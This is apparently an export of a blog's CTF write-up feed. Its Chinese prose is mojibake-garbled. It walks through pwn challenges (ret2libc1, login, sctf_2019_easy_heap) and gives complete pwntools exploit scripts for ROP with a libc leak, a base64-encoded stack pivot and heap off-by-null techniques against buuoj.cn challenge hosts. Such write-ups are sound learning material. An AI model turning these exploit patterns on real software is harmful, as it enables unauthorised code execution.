title="libcçš„è¯write_upæ˜¯æ¨èæ‰‹åŠ¨è®¡ç®—ï¼Œä½†æ˜¯æ²¡ç»™å…·ä½“æ˜¯ä»€ä¹ˆç‰ˆæœ¬çš„libc,ç”¨é¢˜ç›®æœ¬èº«çš„ï¼Œç”¨buuè‡ªå¸¦æä¾›çš„libc-2.23.so,libc-2.27.soéƒ½æ˜¯æ‰“ä¸é€šçš„ã€‚"></a>libcçš„è¯write_upæ˜¯æ¨èæ‰‹åŠ¨è®¡ç®—ï¼Œä½†æ˜¯æ²¡ç»™å…·ä½“æ˜¯ä»€ä¹ˆç‰ˆæœ¬çš„libc,ç”¨é¢˜ç›®æœ¬èº«çš„ï¼Œç”¨buuè‡ªå¸¦æä¾›çš„libc-2.23.so,libc-2.27.soéƒ½æ˜¯æ‰“ä¸é€šçš„ã€‚</h5><pre><code class="lang-py"># libc.blukat.me æŸ¥è¯¢libcç‰ˆæœ¬åæ‰‹åŠ¨è®¡ç®—ï¼ˆæ¨èï¼‰libc_base   =   puts_addr - 0x080970system_addr =   libc_base + 0x04f420bin_addr    =   libc_base + 0x1b3d88</code></pre><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *from LibcSearcher import *p=remote(&quot;node4.buuoj.cn&quot;,27215)#p=process(&quot;./ret2libc1&quot;)elf=ELF(&#39;./ret2libc1&#39;)#libc=ELF(&#39;./libc-2.23.so&#39;)#libc=elf.libccontext.log_level=&quot;debug&quot;puts_plt=0x400520puts_got=elf.got[&#39;puts&#39;]pop_rdi=0x400763main=0x400698ret=0x4006F1payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter(&#39;again&#39;,payload)p.recvuntil(&#39;time&#39;)#gdb.attach(p)sleep(1)puts_addr=u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))#puts_addr=u64(p.recvuntil(&#39;\n&#39;,drop=True).ljust(8,&#39;\x00&#39;))print(hex(puts_addr))base=puts_addr-0x04f420#-libc.sym[&#39;puts&#39;]system=base+0x080970#libc.sym[&#39;system&#39;]binsh=base+0x1b3d88#libc.search(&#39;bin/sh&#39;).next()payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)p.sendlineafter(&#39;again&#39;,payload)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-NewSar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>login</title>
      <link href="/2023/10/23/login/"/>
      <url>/2023/10/23/login/</url>
      
        <content type="html"><![CDATA[<h5 id="ä¾‹è¡Œæ£€æŸ¥ï¼Œè¿™é“é¢˜æ˜¯é™æ€çš„ï¼Œå‡½æ•°å¤šä¸”çœ‹ä¸æ‡‚"><a href="#ä¾‹è¡Œæ£€æŸ¥ï¼Œè¿™é“é¢˜æ˜¯é™æ€çš„ï¼Œå‡½æ•°å¤šä¸”çœ‹ä¸æ‡‚" class="headerlink" title="ä¾‹è¡Œæ£€æŸ¥ï¼Œè¿™é“é¢˜æ˜¯é™æ€çš„ï¼Œå‡½æ•°å¤šä¸”çœ‹ä¸æ‡‚"></a>ä¾‹è¡Œæ£€æŸ¥ï¼Œè¿™é“é¢˜æ˜¯é™æ€çš„ï¼Œå‡½æ•°å¤šä¸”çœ‹ä¸æ‡‚</h5><p><img src="https://i.imgs.ovh/2023/10/23/2NN33.png" alt="image-20231023205047486"></p><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.imgs.ovh/2023/10/23/2N9ae.png" alt="image-20231023204935533"></h5><h5 id="ç¬¬åäº”è¡Œçš„Base64Decodeå‡½æ•°ï¼Œå‚æ•°æ˜¯s-ç”¨æ¥å°†æˆ‘ä»¬è¾“å…¥çš„sè¿›è¡Œè½¬æ¢ï¼Œæ˜¯ä¸€ä¸ªç”¨äºå°†base64æ ¼å¼çš„æ•°æ®è§£ç ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„å‡½æ•°ï¼Œå°†è½¬åŒ–åçš„å€¼æ•°æ®èµ‹ç»™v5ï¼Œç„¶åå†æŠŠå€¼ç»™bssæ®µä¸Šçš„inputã€‚"><a href="#ç¬¬åäº”è¡Œçš„Base64Decodeå‡½æ•°ï¼Œå‚æ•°æ˜¯s-ç”¨æ¥å°†æˆ‘ä»¬è¾“å…¥çš„sè¿›è¡Œè½¬æ¢ï¼Œæ˜¯ä¸€ä¸ªç”¨äºå°†base64æ ¼å¼çš„æ•°æ®è§£ç ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„å‡½æ•°ï¼Œå°†è½¬åŒ–åçš„å€¼æ•°æ®èµ‹ç»™v5ï¼Œç„¶åå†æŠŠå€¼ç»™bssæ®µä¸Šçš„inputã€‚" class="headerlink" title="ç¬¬åäº”è¡Œçš„Base64Decodeå‡½æ•°ï¼Œå‚æ•°æ˜¯s,ç”¨æ¥å°†æˆ‘ä»¬è¾“å…¥çš„sè¿›è¡Œè½¬æ¢ï¼Œæ˜¯ä¸€ä¸ªç”¨äºå°†base64æ ¼å¼çš„æ•°æ®è§£ç ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„å‡½æ•°ï¼Œå°†è½¬åŒ–åçš„å€¼æ•°æ®èµ‹ç»™v5ï¼Œç„¶åå†æŠŠå€¼ç»™bssæ®µä¸Šçš„inputã€‚"></a>ç¬¬åäº”è¡Œçš„Base64Decodeå‡½æ•°ï¼Œå‚æ•°æ˜¯s,ç”¨æ¥å°†æˆ‘ä»¬è¾“å…¥çš„sè¿›è¡Œè½¬æ¢ï¼Œæ˜¯ä¸€ä¸ªç”¨äºå°†base64æ ¼å¼çš„æ•°æ®è§£ç ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„å‡½æ•°ï¼Œå°†è½¬åŒ–åçš„å€¼æ•°æ®èµ‹ç»™v5ï¼Œç„¶åå†æŠŠå€¼ç»™bssæ®µä¸Šçš„inputã€‚</h5><p><img src="https://i.imgs.ovh/2023/10/23/2aClH.png" alt="image-20231023205506057"></p><h5 id="çœ‹å‘ä¸»å‡½æ•°ï¼Œv7è½¬åŒ–åçš„æ•°æ®é•¿åº¦ä¸èƒ½è¶…è¿‡åäºŒï¼Œè¾“å…¥æµ‹è¯•å‘ç°è¾“å…¥çš„é•¿åº¦ä¸èƒ½è¶…è¿‡åä¸€ï¼Œå› ä¸ºè¾“å…¥çš„æ—¶å€™ä¼šåŠ ä¸Šæ¢è¡Œç¬¦ç»“æŸï¼Œsend-å¯ä»¥å‘é€åäºŒä¸ªï¼Œsendlineå¯ä»¥å‘é€åä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åç¬¬äºŒåäºŒè¡ŒæŠŠv7å¤åˆ¶ç»™äº†bssæ®µä¸Šçš„inputï¼Œç„¶åæ˜¯authå‡½æ•°ï¼Œä¼šè¿”å›ä¸€æ®µäºŒè¿›åˆ¶æ•°æ®ç¼–ç ã€‚"><a href="#çœ‹å‘ä¸»å‡½æ•°ï¼Œv7è½¬åŒ–åçš„æ•°æ®é•¿åº¦ä¸èƒ½è¶…è¿‡åäºŒï¼Œè¾“å…¥æµ‹è¯•å‘ç°è¾“å…¥çš„é•¿åº¦ä¸èƒ½è¶…è¿‡åä¸€ï¼Œå› ä¸ºè¾“å…¥çš„æ—¶å€™ä¼šåŠ ä¸Šæ¢è¡Œç¬¦ç»“æŸï¼Œsend-å¯ä»¥å‘é€åäºŒä¸ªï¼Œsendlineå¯ä»¥å‘é€åä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åç¬¬äºŒåäºŒè¡ŒæŠŠv7å¤åˆ¶ç»™äº†bssæ®µä¸Šçš„inputï¼Œç„¶åæ˜¯authå‡½æ•°ï¼Œä¼šè¿”å›ä¸€æ®µäºŒè¿›åˆ¶æ•°æ®ç¼–ç ã€‚" class="headerlink" title="çœ‹å‘ä¸»å‡½æ•°ï¼Œv7è½¬åŒ–åçš„æ•°æ®é•¿åº¦ä¸èƒ½è¶…è¿‡åäºŒï¼Œè¾“å…¥æµ‹è¯•å‘ç°è¾“å…¥çš„é•¿åº¦ä¸èƒ½è¶…è¿‡åä¸€ï¼Œå› ä¸ºè¾“å…¥çš„æ—¶å€™ä¼šåŠ ä¸Šæ¢è¡Œç¬¦ç»“æŸï¼Œsend()å¯ä»¥å‘é€åäºŒä¸ªï¼Œsendlineå¯ä»¥å‘é€åä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åç¬¬äºŒåäºŒè¡ŒæŠŠv7å¤åˆ¶ç»™äº†bssæ®µä¸Šçš„inputï¼Œç„¶åæ˜¯authå‡½æ•°ï¼Œä¼šè¿”å›ä¸€æ®µäºŒè¿›åˆ¶æ•°æ®ç¼–ç ã€‚"></a>çœ‹å‘ä¸»å‡½æ•°ï¼Œv7è½¬åŒ–åçš„æ•°æ®é•¿åº¦ä¸èƒ½è¶…è¿‡åäºŒï¼Œè¾“å…¥æµ‹è¯•å‘ç°è¾“å…¥çš„é•¿åº¦ä¸èƒ½è¶…è¿‡åä¸€ï¼Œå› ä¸ºè¾“å…¥çš„æ—¶å€™ä¼šåŠ ä¸Šæ¢è¡Œç¬¦ç»“æŸï¼Œsend()å¯ä»¥å‘é€åäºŒä¸ªï¼Œsendlineå¯ä»¥å‘é€åä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åç¬¬äºŒåäºŒè¡ŒæŠŠv7å¤åˆ¶ç»™äº†bssæ®µä¸Šçš„inputï¼Œç„¶åæ˜¯authå‡½æ•°ï¼Œä¼šè¿”å›ä¸€æ®µäºŒè¿›åˆ¶æ•°æ®ç¼–ç ã€‚</h5><p><img src="https://i.imgs.ovh/2023/10/23/2a21s.png" alt="image-20231023210859918"></p><p><img src="https://i0.imgs.ovh/2023/10/26/Fbv9I.png" alt="image-20231026202306583"></p><h5 id="payloadè¿™æ ·å†™"><a href="#payloadè¿™æ ·å†™" class="headerlink" title="payloadè¿™æ ·å†™"></a>payloadè¿™æ ·å†™</h5><pre><code class="lang-py">payload=&#39;aaaa&#39;+p32(0x8049284)+p32(0x811EB40)payload=base64.b64encode(payload)</code></pre><h5 id="åªèƒ½åˆšå¥½è¦†ç›–åˆ°ebpï¼Œå› ä¸ºæœ€å¤šè¾“å…¥0xcä¸ªå­—èŠ‚ï¼Œpayloadç”¨å‡½æ•°ç¼–ç ä¸ºbase64å­—ç¬¦é›†ï¼Œbase64-b64encodeï¼ˆï¼‰å‡½æ•°æ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®ç¼–ç ä¸ºBase64å­—ç¬¦ä¸²ï¼Œåœ¨ç¨‹åºä¸­ç»è¿‡Base64Decodeï¼ˆï¼‰å‡½æ•°ç¼–ç ä¸ºäºŒè¿›åˆ¶æ•°æ®ç¼–ç ï¼Œä¹Ÿå°±æ˜¯åŸæ¥çš„æ•°æ®ï¼Œåœ¨ç¨‹åºä¸­ä¼šæŠŠæ•°æ®ç»™bssæ®µä¸Šçš„inputï¼Œè¿›å…¥authå‡½æ•°ä¼šå°†æ•°æ®ä¼ ç»™v4-v4çš„å¤§å°æ˜¯å…«å­—èŠ‚ï¼Œä¼šè¦†ç›–åˆ°ebp-ebpæ˜¯inputçš„åœ°å€0x811EB40-ç„¶åauthå‡½æ•°ç»“æŸçš„æ—¶å€™ï¼ŒleaveæŒ‡ä»¤ä»¥åespä¼šæŒ‡å‘0x811eb40ï¼Œç„¶ååˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤espè‡ªåŠ¨åŠ å››ï¼Œesp-esp-4ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨correctå‡½æ•°çš„åœ°å€ï¼Œç„¶åææƒ"><a href="#åªèƒ½åˆšå¥½è¦†ç›–åˆ°ebpï¼Œå› ä¸ºæœ€å¤šè¾“å…¥0xcä¸ªå­—èŠ‚ï¼Œpayloadç”¨å‡½æ•°ç¼–ç ä¸ºbase64å­—ç¬¦é›†ï¼Œbase64-b64encodeï¼ˆï¼‰å‡½æ•°æ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®ç¼–ç ä¸ºBase64å­—ç¬¦ä¸²ï¼Œåœ¨ç¨‹åºä¸­ç»è¿‡Base64Decodeï¼ˆï¼‰å‡½æ•°ç¼–ç ä¸ºäºŒè¿›åˆ¶æ•°æ®ç¼–ç ï¼Œä¹Ÿå°±æ˜¯åŸæ¥çš„æ•°æ®ï¼Œåœ¨ç¨‹åºä¸­ä¼šæŠŠæ•°æ®ç»™bssæ®µä¸Šçš„inputï¼Œè¿›å…¥authå‡½æ•°ä¼šå°†æ•°æ®ä¼ ç»™v4-v4çš„å¤§å°æ˜¯å…«å­—èŠ‚ï¼Œä¼šè¦†ç›–åˆ°ebp-ebpæ˜¯inputçš„åœ°å€0x811EB40-ç„¶åauthå‡½æ•°ç»“æŸçš„æ—¶å€™ï¼ŒleaveæŒ‡ä»¤ä»¥åespä¼šæŒ‡å‘0x811eb40ï¼Œç„¶ååˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤espè‡ªåŠ¨åŠ å››ï¼Œesp-esp-4ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨correctå‡½æ•°çš„åœ°å€ï¼Œç„¶åææƒ" class="headerlink" title="åªèƒ½åˆšå¥½è¦†ç›–åˆ°ebpï¼Œå› ä¸ºæœ€å¤šè¾“å…¥0xcä¸ªå­—èŠ‚ï¼Œpayloadç”¨å‡½æ•°ç¼–ç ä¸ºbase64å­—ç¬¦é›†ï¼Œbase64.b64encodeï¼ˆï¼‰å‡½æ•°æ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®ç¼–ç ä¸ºBase64å­—ç¬¦ä¸²ï¼Œåœ¨ç¨‹åºä¸­ç»è¿‡Base64Decodeï¼ˆï¼‰å‡½æ•°ç¼–ç ä¸ºäºŒè¿›åˆ¶æ•°æ®ç¼–ç ï¼Œä¹Ÿå°±æ˜¯åŸæ¥çš„æ•°æ®ï¼Œåœ¨ç¨‹åºä¸­ä¼šæŠŠæ•°æ®ç»™bssæ®µä¸Šçš„inputï¼Œè¿›å…¥authå‡½æ•°ä¼šå°†æ•°æ®ä¼ ç»™v4,v4çš„å¤§å°æ˜¯å…«å­—èŠ‚ï¼Œä¼šè¦†ç›–åˆ°ebp,ebpæ˜¯inputçš„åœ°å€0x811EB40,ç„¶åauthå‡½æ•°ç»“æŸçš„æ—¶å€™ï¼ŒleaveæŒ‡ä»¤ä»¥åespä¼šæŒ‡å‘0x811eb40ï¼Œç„¶ååˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤espè‡ªåŠ¨åŠ å››ï¼Œesp=esp+4ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨correctå‡½æ•°çš„åœ°å€ï¼Œç„¶åææƒ"></a>åªèƒ½åˆšå¥½è¦†ç›–åˆ°ebpï¼Œå› ä¸ºæœ€å¤šè¾“å…¥0xcä¸ªå­—èŠ‚ï¼Œpayloadç”¨å‡½æ•°ç¼–ç ä¸ºbase64å­—ç¬¦é›†ï¼Œbase64.b64encodeï¼ˆï¼‰å‡½æ•°æ˜¯Pythonæ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®ç¼–ç ä¸ºBase64å­—ç¬¦ä¸²ï¼Œåœ¨ç¨‹åºä¸­ç»è¿‡Base64Decodeï¼ˆï¼‰å‡½æ•°ç¼–ç ä¸ºäºŒè¿›åˆ¶æ•°æ®ç¼–ç ï¼Œä¹Ÿå°±æ˜¯åŸæ¥çš„æ•°æ®ï¼Œåœ¨ç¨‹åºä¸­ä¼šæŠŠæ•°æ®ç»™bssæ®µä¸Šçš„inputï¼Œè¿›å…¥authå‡½æ•°ä¼šå°†æ•°æ®ä¼ ç»™v4,v4çš„å¤§å°æ˜¯å…«å­—èŠ‚ï¼Œä¼šè¦†ç›–åˆ°ebp,ebpæ˜¯inputçš„åœ°å€0x811EB40,ç„¶åauthå‡½æ•°ç»“æŸçš„æ—¶å€™ï¼ŒleaveæŒ‡ä»¤ä»¥åespä¼šæŒ‡å‘0x811eb40ï¼Œç„¶ååˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤espè‡ªåŠ¨åŠ å››ï¼Œesp=esp+4ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨correctå‡½æ•°çš„åœ°å€ï¼Œç„¶åææƒ</h5><p><img src="https://i0.imgs.ovh/2023/10/26/Fbacj.png" alt="image-20231026205553321"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoPSJ.png" alt="image-20231026204932010"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoCMV.png" alt="image-20231026205315054"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoVdW.png" alt="image-20231026205440817"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="lang-py">from pwn import*import base64from LibcSearcher import *p=remote(&quot;node4.buuoj.cn&quot;,29010)#p=process(&quot;./login&quot;)context.log_level=&quot;debug&quot;shell=0x08049284fake_addr=0x811eb40#payload=&#39;a&#39;*0x4+p32(shell)+p32(fake_addr)payload=base64.b64encode(payload)#gdb.attach(p)sleep(1)p.sendlineafter(&#39;Authenticate :&#39;,payload)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf_2019_easy_heap</title>
      <link href="/2023/10/21/sctf-2019-easy-heap/"/>
      <url>/2023/10/21/sctf-2019-easy-heap/</url>
      
        <content type="html"><![CDATA[<h4 id="è¿™é“é¢˜ç”¨off-by-nullè§£"><a href="#è¿™é“é¢˜ç”¨off-by-nullè§£" class="headerlink" title="è¿™é“é¢˜ç”¨off by nullè§£"></a>è¿™é“é¢˜ç”¨off by nullè§£</h4><h5 id="ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€-ä¸èƒ½åˆ©ç”¨gotè¡¨ï¼Œåªèƒ½ç”¨hookçš„åœ°å€"><a href="#ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€-ä¸èƒ½åˆ©ç”¨gotè¡¨ï¼Œåªèƒ½ç”¨hookçš„åœ°å€" class="headerlink" title="ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€,ä¸èƒ½åˆ©ç”¨gotè¡¨ï¼Œåªèƒ½ç”¨hookçš„åœ°å€"></a>ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€,ä¸èƒ½åˆ©ç”¨gotè¡¨ï¼Œåªèƒ½ç”¨hookçš„åœ°å€</h5><p><img src="https://i.imgs.ovh/2023/10/21/2tYAH.png" alt="image-20231021201805120"></p><h5 id="ç¨‹åºè¿è¡Œå‰ä¼šæ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠbufçš„åœ°å€æ˜ å°„åˆ°æŸä¸ª0x1000å¤§å°çš„åœ°å€ä¸Šï¼Œå¹¶è¿”å›è¿™ä¸ªåœ°å€ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯å¯æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨shellcodeã€‚"><a href="#ç¨‹åºè¿è¡Œå‰ä¼šæ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠbufçš„åœ°å€æ˜ å°„åˆ°æŸä¸ª0x1000å¤§å°çš„åœ°å€ä¸Šï¼Œå¹¶è¿”å›è¿™ä¸ªåœ°å€ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯å¯æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨shellcodeã€‚" class="headerlink" title="ç¨‹åºè¿è¡Œå‰ä¼šæ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠbufçš„åœ°å€æ˜ å°„åˆ°æŸä¸ª0x1000å¤§å°çš„åœ°å€ä¸Šï¼Œå¹¶è¿”å›è¿™ä¸ªåœ°å€ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯å¯æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨shellcodeã€‚"></a>ç¨‹åºè¿è¡Œå‰ä¼šæ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠbufçš„åœ°å€æ˜ å°„åˆ°æŸä¸ª0x1000å¤§å°çš„åœ°å€ä¸Šï¼Œå¹¶è¿”å›è¿™ä¸ªåœ°å€ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯å¯æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨shellcodeã€‚</h5><h5 id="mmap-å‡½æ•°çš„æƒé™å‚æ•°æŒ‡å®šäº†å°†è¦æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜åŒºåŸŸçš„è®¿é—®æƒé™ã€‚æƒé™å‚æ•°å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š"><a href="#mmap-å‡½æ•°çš„æƒé™å‚æ•°æŒ‡å®šäº†å°†è¦æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜åŒºåŸŸçš„è®¿é—®æƒé™ã€‚æƒé™å‚æ•°å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š" class="headerlink" title="mmap()å‡½æ•°çš„æƒé™å‚æ•°æŒ‡å®šäº†å°†è¦æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜åŒºåŸŸçš„è®¿é—®æƒé™ã€‚æƒé™å‚æ•°å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š"></a>mmap()å‡½æ•°çš„æƒé™å‚æ•°æŒ‡å®šäº†å°†è¦æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´çš„å†…å­˜åŒºåŸŸçš„è®¿é—®æƒé™ã€‚æƒé™å‚æ•°å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š</h5><ul><li>PROT_EXECï¼šå…è®¸å¯¹å†…å­˜æ˜ å°„åŒºåŸŸè¿›è¡Œæ‰§è¡Œè®¿é—®ã€‚</li><li>PROT_READï¼šå…è®¸å¯¹å†…å­˜æ˜ å°„åŒºåŸŸè¿›è¡Œè¯»å–è®¿é—®ã€‚</li><li>PROT_WRITEï¼šå…è®¸å¯¹å†…å­˜æ˜ å°„åŒºåŸŸè¿›è¡Œå†™å…¥è®¿é—®ã€‚</li><li>PROT_NONEï¼šç¦æ­¢å¯¹å†…å­˜æ˜ å°„åŒºåŸŸè¿›è¡Œä»»ä½•è®¿é—®ã€‚</li></ul><h5 id="å½“æƒé™å‚æ•°çš„å€¼ä¸º7æ—¶ï¼Œå®é™…ä¸Šæ˜¯å°†PROT-EXECã€PROT-READå’ŒPROT-WRITEä¸‰ä¸ªæƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œ7-4-2-1ã€‚å› æ­¤ï¼Œæƒé™å‚æ•°ä¸º7è¡¨ç¤ºå°†å†…å­˜æ˜ å°„åŒºåŸŸè®¾ç½®ä¸ºå¯æ‰§è¡Œã€è¯»å–å’Œå†™å…¥ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œä¸å»ºè®®å°†è¿™äº›æƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ã€‚é€šå¸¸å»ºè®®åªä½¿ç”¨å¿…è¦çš„æƒé™æ¥ä¿æŠ¤å†…å­˜æ˜ å°„åŒºåŸŸçš„å®‰å…¨æ€§ã€‚"><a href="#å½“æƒé™å‚æ•°çš„å€¼ä¸º7æ—¶ï¼Œå®é™…ä¸Šæ˜¯å°†PROT-EXECã€PROT-READå’ŒPROT-WRITEä¸‰ä¸ªæƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œ7-4-2-1ã€‚å› æ­¤ï¼Œæƒé™å‚æ•°ä¸º7è¡¨ç¤ºå°†å†…å­˜æ˜ å°„åŒºåŸŸè®¾ç½®ä¸ºå¯æ‰§è¡Œã€è¯»å–å’Œå†™å…¥ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œä¸å»ºè®®å°†è¿™äº›æƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ã€‚é€šå¸¸å»ºè®®åªä½¿ç”¨å¿…è¦çš„æƒé™æ¥ä¿æŠ¤å†…å­˜æ˜ å°„åŒºåŸŸçš„å®‰å…¨æ€§ã€‚" class="headerlink" title="å½“æƒé™å‚æ•°çš„å€¼ä¸º7æ—¶ï¼Œå®é™…ä¸Šæ˜¯å°†PROT_EXECã€PROT_READå’ŒPROT_WRITEä¸‰ä¸ªæƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œ7=4+2+1ã€‚å› æ­¤ï¼Œæƒé™å‚æ•°ä¸º7è¡¨ç¤ºå°†å†…å­˜æ˜ å°„åŒºåŸŸè®¾ç½®ä¸ºå¯æ‰§è¡Œã€è¯»å–å’Œå†™å…¥ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œä¸å»ºè®®å°†è¿™äº›æƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ã€‚é€šå¸¸å»ºè®®åªä½¿ç”¨å¿…è¦çš„æƒé™æ¥ä¿æŠ¤å†…å­˜æ˜ å°„åŒºåŸŸçš„å®‰å…¨æ€§ã€‚"></a>å½“æƒé™å‚æ•°çš„å€¼ä¸º7æ—¶ï¼Œå®é™…ä¸Šæ˜¯å°†PROT_EXECã€PROT_READå’ŒPROT_WRITEä¸‰ä¸ªæƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œ7=4+2+1ã€‚å› æ­¤ï¼Œæƒé™å‚æ•°ä¸º7è¡¨ç¤ºå°†å†…å­˜æ˜ å°„åŒºåŸŸè®¾ç½®ä¸ºå¯æ‰§è¡Œã€è¯»å–å’Œå†™å…¥ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œä¸å»ºè®®å°†è¿™äº›æƒé™ç»„åˆåœ¨ä¸€èµ·ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨æ¼æ´ã€‚é€šå¸¸å»ºè®®åªä½¿ç”¨å¿…è¦çš„æƒé™æ¥ä¿æŠ¤å†…å­˜æ˜ å°„åŒºåŸŸçš„å®‰å…¨æ€§ã€‚</h5><p><img src="https://i.imgs.ovh/2023/10/21/21wjI.png" alt="image-20231021203428599"></p><h5 id="å•ç‹¬åœ°æŠŠè¾“å…¥å †é‡Œçš„å†…å®¹çš„å‡½æ•°æ”¾å‡ºæ¥ï¼ŒåŒå‡»ä¸€ä¸‹ï¼Œå°±æ˜¯ç›¸å½“äºreadå‡½æ•°"><a href="#å•ç‹¬åœ°æŠŠè¾“å…¥å †é‡Œçš„å†…å®¹çš„å‡½æ•°æ”¾å‡ºæ¥ï¼ŒåŒå‡»ä¸€ä¸‹ï¼Œå°±æ˜¯ç›¸å½“äºreadå‡½æ•°" class="headerlink" title="å•ç‹¬åœ°æŠŠè¾“å…¥å †é‡Œçš„å†…å®¹çš„å‡½æ•°æ”¾å‡ºæ¥ï¼ŒåŒå‡»ä¸€ä¸‹ï¼Œå°±æ˜¯ç›¸å½“äºreadå‡½æ•°"></a>å•ç‹¬åœ°æŠŠè¾“å…¥å †é‡Œçš„å†…å®¹çš„å‡½æ•°æ”¾å‡ºæ¥ï¼ŒåŒå‡»ä¸€ä¸‹ï¼Œå°±æ˜¯ç›¸å½“äºreadå‡½æ•°</h5><p><img src="https://i.imgs.ovh/2023/10/21/21fLV.png" alt="image-20231021203536497"></p><h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><h5 id="æŒ‰ç…§é¢˜è§£é‡Œçš„æµç¨‹ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x410å¤§å°çš„å †ï¼Œå¹¶æ¥æ”¶å…¶åœ°å€-è¿™ä¸ªåœ°å€å­˜äº†mallocçš„å †çš„åœ°å€"><a href="#æŒ‰ç…§é¢˜è§£é‡Œçš„æµç¨‹ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x410å¤§å°çš„å †ï¼Œå¹¶æ¥æ”¶å…¶åœ°å€-è¿™ä¸ªåœ°å€å­˜äº†mallocçš„å †çš„åœ°å€" class="headerlink" title="æŒ‰ç…§é¢˜è§£é‡Œçš„æµç¨‹ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x410å¤§å°çš„å †ï¼Œå¹¶æ¥æ”¶å…¶åœ°å€,è¿™ä¸ªåœ°å€å­˜äº†mallocçš„å †çš„åœ°å€"></a>æŒ‰ç…§é¢˜è§£é‡Œçš„æµç¨‹ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x410å¤§å°çš„å 